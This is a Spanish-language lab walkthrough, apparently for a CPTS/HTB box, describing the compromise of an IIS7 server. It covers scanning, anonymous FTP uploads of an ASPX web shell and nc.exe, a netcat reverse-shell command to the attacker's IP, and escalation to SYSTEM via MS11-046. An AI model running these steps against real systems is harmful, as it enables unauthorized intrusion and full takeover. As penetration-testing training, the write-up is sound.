#CPTS #IIS #WebShell #FileUpload #ASPX #MS11-046
```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.58.185 -oG allPorts
```

Encontramos abiertos los puertos `21` y `80` haremos un reconocimiento mas exhaustivo de esos puertos con [[NMAP]]
```shell
nmap -p21,80 -sCV 10.129.58.185 -oN targeted 
```

![[Pasted image 20260916161706.png]]

Descubrimos que esta habilitado el acceso como *Anonymous* a través de *FTP*, así que accederemos usando este usuario al servicio.
Vamos a ver de que se trata la imagen que hay en el directorio
![[Pasted image 20260916163247.png]]

Vemos que es un *Microsoft IIS7*, accederemos también a la web para ver que se encuentra en ella, primero enumeraremos las tecnologías que usa usando [[WHATWEB]]
```shell
whatweb http://10.129.58.185
```
![[Pasted image 20260916163419.png]]

También accederemos a la web a través del navegador, en la web únicamente observamos que la imagen encontrada antes en el *FTP* 

Buscaremos si tenemos capacidad de escritura sobre el *FTP* ya que hemos visto que este esta relacionado a la web que se muestra ya que el contenido a mostrar es idéntico el uno al otro.

Crearemos un archivo llamado `prueba.txt` con contenido `whoami` y lo probaremos a subir al *FTP*
```shell
touch prueba.txt 
```

```shell
whoami > prueba.txt 
```

Lo subiremos al *FTP* usando
```shell
put prueba.txt
```

El comando `whoami` se ejecuta en nuestra maquina y el resultado se guarda en el archivo `prueba.txt` ahora en el navegador podemos apuntar a el dándonos como respuesta el nombre de nuestro usuario
![[Pasted image 20260917093314.png]]

Por lo cual vemos que podemos subir archivos, en *Microsoft IIS* se pueden subir unos archivos con la extensión `.aspx`, que son los que nos van a permitir la ejecución remota de comandos *RCE*.
Buscaremos archivos que sean extensión `.aspx` en nuestro equipo por si alguno tiene correspondencia con `cmd` para poder intentar ejecutar una *Web Shell*
```shell
locate .aspx | grep cmd
```

Nos copiaremos un archivo llamado `/usr/share/davtest/backdoors/aspx_cmd.aspx` a nuestro directorio actual.

Lo subiremos al *FTP* y accederemos a el a través del navegador
```shell
put aspx_cmd.aspx
```

Al acceder a el a traves del navegador podemos encontrar que se esta ejecutando la *Web Shell*
![[Pasted image 20260917094838.png]]

Vamos a probar a ejecutar comandos en este caso ejecutaremos un `whoami`
![[Pasted image 20260917094925.png]]

Ahora deberemos de subir [[NETCAT]] a la maquina victima, para ello deberemos acceder al servicio *FTP* ponernos en modo binario ya que lo que vamos a subir es un binario ejecutable `.exe`.
```shell
binary
```

Y subiremos en binario ejecutable de [[NETCAT]] `nc.exe`
```shell
put nc.exe
```

Ahora accederemos a la web en busqueda de saber en que ubicacion estamos en el equipo victima, en este caso ejecutaremos el comando `dir` y descubriremos que el ejecutable no se encuentra en la ruta actual que es `c:\windows\system32\inetsrv` tendremos que buscar en la ruta en la que suelen estar estos ficheros que se pueden subir a la web via *FTP*

Estos archivos se suelen encontrar en la ruta `C:\inetpub\wwwroot`
![[Pasted image 20260917105120.png]]

Encontrando aquí el archivo de `nc.exe` que hemos subido con anterioridad, sabiendo que en esta ejecutándose el `nc.exe` nos podemos enviar una reverse shell a nuestra maquina a través de la *Web Shell*
```shell
C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.226 443
```

Poniéndonos en escucha con
```shell
rlwrap nc -nlvp 443
```

Obteniendo una *Reverse Shell*
En la ruta `C:\Users` encontramos que hay un usuario *babis* y el usuario *Administrator*
Y no podemos acceder a ninguna de estas dos rutas así que deberemos movernos lateralmente, veremos que privilegios tenemos con el usuario actual
```shell
whoami /priv
```

Y vemos que podemos aprovecharnos de `SeImpersonatePrivilege` para impersonar a otro usuario y poder acceder como el. 
También tenemos el método de escalada aprovechándonos de la versión del SO en este c aso lo veremos usando
```shell
systemversion
```

Devolviéndonos `6.1.7600 N/A Build 7600`, lo buscaremos en internet si nos podemos aprovechar de el para escalar privilegios.

Encontramos que hay una escalada con `afd.sys` o también conocido como *MS11-046*, lo buscamos en internet en búsqueda de algún exploit para aprovecharnos de el encontrando `https://github.com/SecWiki/windows-kernel-exploits/blob/master/README.md`.

Lo que hay que hacer para explotarlo es descargarse el binario que se ofrece en el GitHub para la explotación y ejecutarlo en la maquina victima, podemos subirlo mediante *FTP* y ejecutarlo en la maquina victima obteniendo una escalada de privilegios a *NT AUTHORITY SYSTEM*, obteneindo las flags de los ususarios



